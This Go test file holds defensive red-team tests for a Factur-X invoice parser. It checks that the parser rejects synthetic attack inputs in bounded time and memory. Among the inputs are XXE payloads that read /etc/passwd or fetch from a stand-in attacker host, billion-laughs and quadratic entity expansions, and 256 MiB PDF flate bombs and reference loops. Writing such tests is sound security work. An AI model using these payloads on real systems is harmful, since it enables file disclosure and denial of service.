// Red-team attack tests for Factur-X parsing (J0 task T30): XML entity
// attacks, encodings, nesting, PDF-level decompression bombs, reference
// loops, truncated and oversized PDFs. A test passes when the attack is
// defeated: an error, bounded time and bounded memory, never a crash.
// Every input is synthetic.
package facturx_test

import (
	"bytes"
	"compress/zlib"
	"context"
	"errors"
	"fmt"
	"io"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/FlorianRuen/facto/internal/normalize/facturx"
)

const atkCIIOpen = `<rsm:CrossIndustryInvoice xmlns:rsm="urn:un:unece:uncefact:data:standard:CrossIndustryInvoice:100" xmlns:ram="urn:un:unece:uncefact:data:standard:ReusableAggregateBusinessInformationEntity:100">`

const atkCIIClose = `</rsm:CrossIndustryInvoice>`

// atkSeller wraps v at the seller name path.
func atkSeller(v string) string {
	return `<rsm:SupplyChainTradeTransaction><ram:ApplicableHeaderTradeAgreement><ram:SellerTradeParty><ram:Name>` +
		v + `</ram:Name></ram:SellerTradeParty></ram:ApplicableHeaderTradeAgreement></rsm:SupplyChainTradeTransaction>`
}

// atkWithin runs f and fails if it takes longer than d.
func atkWithin(t *testing.T, d time.Duration, what string, f func()) {
	t.Helper()
	done := make(chan struct{})
	go func() { defer close(done); f() }()
	select {
	case <-done:
	case <-time.After(d):
		t.Fatalf("%s did not finish within %v", what, d)
	}
}

// TestAttack_ParseCIIRejectsEntityAndEncodingAttacks feeds the classic XML
// attacks. Each must be refused (an error, zero Invoice) quickly, and no
// expansion may surface in a field.
func TestAttack_ParseCIIRejectsEntityAndEncodingAttacks(t *testing.T) {
	t.Parallel()
	laughs := `<!DOCTYPE r [<!ENTITY a "lollollollollollollollollollol">`
	for i := 1; i <= 9; i++ {
		laughs += fmt.Sprintf(`<!ENTITY %c "%s">`, 'a'+i, strings.Repeat(fmt.Sprintf("&%c;", 'a'+i-1), 10))
	}
	laughs += `]>`
	quad := `<!DOCTYPE r [<!ENTITY x "` + strings.Repeat("A", 50_000) + `">]>`
	deep := strings.Repeat("<ram:X>", 200_000) + strings.Repeat("</ram:X>", 200_000)
	tests := []struct{ name, doc string }{
		{"xxe file", `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>` + atkCIIOpen + atkSeller("&x;") + atkCIIClose},
		{"xxe http", `<!DOCTYPE r [<!ENTITY x SYSTEM "https://attacker.test/x">]>` + atkCIIOpen + atkSeller("&x;") + atkCIIClose},
		{"parameter entity", `<!DOCTYPE r [<!ENTITY % p SYSTEM "https://attacker.test/p.dtd"> %p;]>` + atkCIIOpen + atkCIIClose},
		{"external dtd", `<!DOCTYPE r SYSTEM "https://attacker.test/r.dtd">` + atkCIIOpen + atkCIIClose},
		{"billion laughs", laughs + atkCIIOpen + atkSeller("&j;") + atkCIIClose},
		{"quadratic blowup", quad + atkCIIOpen + atkSeller(strings.Repeat("&x;", 2000)) + atkCIIClose},
		{"undeclared entity", atkCIIOpen + atkSeller("&xxe;") + atkCIIClose},
		{"doctype inside root", atkCIIOpen + `<!DOCTYPE r [<!ENTITY x "y">]>` + atkSeller("&x;") + atkCIIClose},
		{"lowercase doctype", `<!doctype r [<!ENTITY x "y">]>` + atkCIIOpen + atkSeller("&x;") + atkCIIClose},
		{"utf-16 declaration", `<?xml version="1.0" encoding="UTF-16"?>` + atkCIIOpen + atkCIIClose},
		{"utf-7 declaration", `<?xml version="1.0" encoding="UTF-7"?>+ADw-!DOCTYPE r+AD4-` + atkCIIOpen + atkCIIClose},
		{"latin-1 declaration", `<?xml version="1.0" encoding="ISO-8859-1"?>` + atkCIIOpen + atkCIIClose},
		{"utf-16 bom", "\xfe\xff\x00<\x00r\x00/\x00>"},
		{"nul char ref", atkCIIOpen + atkSeller("a&#0;b") + atkCIIClose},
		{"200k nesting", atkCIIOpen + deep + atkCIIClose},
		{"second root", atkCIIOpen + atkCIIClose + atkCIIOpen + atkCIIClose},
		{"cdata outside root", atkCIIOpen + atkCIIClose + `<![CDATA[x]]>`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			var (
				inv facturx.Invoice
				err error
			)
			atkWithin(t, 5*time.Second, "ParseCII", func() { inv, err = facturx.ParseCII(strings.NewReader(tt.doc)) })
			if err == nil {
				t.Fatalf("ParseCII accepted the payload: %+v", inv)
			}
			if inv != (facturx.Invoice{}) {
				t.Errorf("ParseCII returned data with an error: %+v", inv)
			}
			if strings.Contains(err.Error(), "root:") || strings.Contains(err.Error(), "lollol") {
				t.Errorf("error echoes expanded or external content: %.200v", err)
			}
		})
	}
}

// atkEndless is an endless reader counting what was read.
type atkEndless struct{ n int64 }

func (e *atkEndless) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = '%'
	}
	e.n += int64(len(p))
	return len(p), nil
}

// TestAttack_Extract2GBPDFIsNotRead feeds a "2 GB PDF" as an endless
// stream: Extract must stop after MaxPDFSize+1 bytes.
func TestAttack_Extract2GBPDFIsNotRead(t *testing.T) {
	t.Parallel()
	r := &atkEndless{}
	_, err := facturx.Extract(t.Context(), io.LimitReader(r, 2<<30))
	if !errors.Is(err, facturx.ErrTooLarge) {
		t.Fatalf("err = %v, want ErrTooLarge", err)
	}
	if r.n > facturx.MaxPDFSize+64<<10 {
		t.Errorf("read %d bytes, want at most about MaxPDFSize (%d)", r.n, facturx.MaxPDFSize)
	}
}

// atkBomb returns zlib(n zero bytes).
func atkBomb(t *testing.T, n int) []byte {
	t.Helper()
	var z bytes.Buffer
	zw, err := zlib.NewWriterLevel(&z, zlib.BestSpeed)
	if err != nil {
		t.Fatal(err)
	}
	chunk := make([]byte, 1<<20)
	for range n >> 20 {
		if _, err := zw.Write(chunk); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return z.Bytes()
}

// TestAttack_ExtractPDFLevelBombsAreBounded puts 256 MiB (8x MaxPDFSize) flate bombs where
// pdfcpu itself may decode them while reading the structure: the page
// content stream, the catalog metadata, an attachment with a double flate
// filter, and the attachment itself. Extract must fail or succeed within
// its time bound without allocating anywhere near the bomb size.
func TestAttack_ExtractPDFLevelBombsAreBounded(t *testing.T) {
	bomb := atkBomb(t, 256<<20)
	stream := func(dict string) string {
		return fmt.Sprintf("<< %s /Filter /FlateDecode /Length %d >>\nstream\n%s\nendstream", dict, len(bomb), bomb)
	}
	cases := map[string][]byte{
		"page content": rawPDF(t, "<< /Type /Catalog /Pages 2 0 R >>", pagesObj,
			"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>", stream("")),
		"catalog metadata": rawPDF(t, "<< /Type /Catalog /Pages 2 0 R /Metadata 4 0 R >>", pagesObj, pageObj,
			stream("/Type /Metadata /Subtype /XML")),
		"double flate attachment": rawPDF(t, catalogWithTree, pagesObj, pageObj,
			"<< /Names [(factur-x.xml) 5 0 R] >>",
			"<< /Type /Filespec /F (factur-x.xml) /UF (factur-x.xml) /EF << /F 6 0 R >> >>",
			fmt.Sprintf("<< /Type /EmbeddedFile /Filter [/FlateDecode /FlateDecode] /Length %d >>\nstream\n%s\nendstream", len(bomb), bomb)),
		"attachment": rawPDF(t, catalogWithTree, pagesObj, pageObj,
			"<< /Names [(factur-x.xml) 5 0 R] >>",
			"<< /Type /Filespec /F (factur-x.xml) /UF (factur-x.xml) /EF << /F 6 0 R >> >>",
			stream("/Type /EmbeddedFile")),
	}
	for name, pdf := range cases {
		t.Run(name, func(t *testing.T) {
			var before, after runtime.MemStats
			runtime.GC()
			runtime.ReadMemStats(&before)
			var err error
			atkWithin(t, 20*time.Second, "Extract", func() { _, err = facturx.Extract(t.Context(), bytes.NewReader(pdf)) })
			runtime.ReadMemStats(&after)
			if err == nil {
				t.Errorf("Extract accepted a bomb PDF")
			}
			if alloc := after.TotalAlloc - before.TotalAlloc; alloc > 512<<20 {
				t.Errorf("Extract allocated %d MiB on a %d KiB bomb", alloc>>20, len(bomb)>>10)
			}
		})
	}
}

// TestAttack_ExtractHostileStructuresTerminate feeds reference loops,
// self-referencing objects, an xref /Prev loop, absurd lengths and a very
// wide /Kids array. Extract must return an error in bounded time.
func TestAttack_ExtractHostileStructuresTerminate(t *testing.T) {
	t.Parallel()
	var kids strings.Builder
	objs := []string{catalogWithTree, pagesObj, pageObj, ""}
	const wide = 100_000
	for i := range wide {
		fmt.Fprintf(&kids, "%d 0 R ", 5+i)
		objs = append(objs, "<< >>")
	}
	objs[3] = "<< /Kids [" + kids.String() + "] >>"

	prevLoop := rawPDF(t, "<< /Type /Catalog /Pages 2 0 R >>", pagesObj, pageObj)
	prevLoop = bytes.Replace(prevLoop, []byte("/Root 1 0 R"), []byte(fmt.Sprintf("/Root 1 0 R /Prev %d", bytes.LastIndex(prevLoop, []byte("xref")))), 1)

	cases := map[string][]byte{
		"names is self reference":      rawPDF(t, "<< /Type /Catalog /Pages 2 0 R /Names 4 0 R >>", pagesObj, pageObj, "4 0 R"),
		"embedded files ref loop":      rawPDF(t, "<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 4 0 R >> >>", pagesObj, pageObj, "5 0 R", "4 0 R"),
		"kid is its own parent":        rawPDF(t, catalogWithTree, pagesObj, pageObj, "<< /Kids [4 0 R] >>"),
		"two kids point at each other": rawPDF(t, catalogWithTree, pagesObj, pageObj, "<< /Kids [5 0 R] >>", "<< /Kids [4 0 R] >>"),
		"filespec ef loop": rawPDF(t, catalogWithTree, pagesObj, pageObj, "<< /Names [(factur-x.xml) 5 0 R] >>",
			"<< /Type /Filespec /F (factur-x.xml) /EF 5 0 R >>"),
		"huge length": rawPDF(t, catalogWithTree, pagesObj, pageObj, "<< /Names [(factur-x.xml) 5 0 R] >>",
			"<< /Type /Filespec /F (factur-x.xml) /EF << /F 6 0 R >> >>",
			"<< /Type /EmbeddedFile /Length 9223372036854775807 >>\nstream\nabc\nendstream"),
		"negative length": rawPDF(t, catalogWithTree, pagesObj, pageObj, "<< /Names [(factur-x.xml) 5 0 R] >>",
			"<< /Type /Filespec /F (factur-x.xml) /EF << /F 6 0 R >> >>",
			"<< /Type /EmbeddedFile /Length -5 >>\nstream\nabc\nendstream"),
		"xref prev loop":   prevLoop,
		"100k wide kids":   rawPDF(t, objs...),
		"header only":      []byte("%PDF-1.7\n"),
		"startxref beyond": []byte("%PDF-1.7\nstartxref\n999999999\n%%EOF\n"),
	}
	for name, pdf := range cases {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			ctx, cancel := context.WithTimeout(t.Context(), 30*time.Second)
			defer cancel()
			var (
				inv facturx.Invoice
				err error
			)
			atkWithin(t, 20*time.Second, "Extract", func() { inv, err = facturx.Extract(ctx, bytes.NewReader(pdf)) })
			if err == nil {
				t.Errorf("Extract accepted a hostile structure: %+v", inv)
			}
		})
	}
}

// TestAttack_ExtractTruncatedPDFsNeverCrash cuts a valid Factur-X PDF at
// every 13th byte: no cut may panic (a panic in a goroutine pdfcpu started
// would kill the process) or hang.
func TestAttack_ExtractTruncatedPDFsNeverCrash(t *testing.T) {
	t.Parallel()
	pdf := buildPDF(t, synthAttachment{file: nameFacturX, data: basicXML(t), flate: true})
	atkWithin(t, 120*time.Second, "truncation sweep", func() {
		for n := 0; n < len(pdf); n += 13 {
			inv, err := facturx.Extract(t.Context(), bytes.NewReader(pdf[:n]))
			if err == nil && inv.Number == "" {
				t.Errorf("cut at %d: no error and no data", n)
			}
		}
	})
}
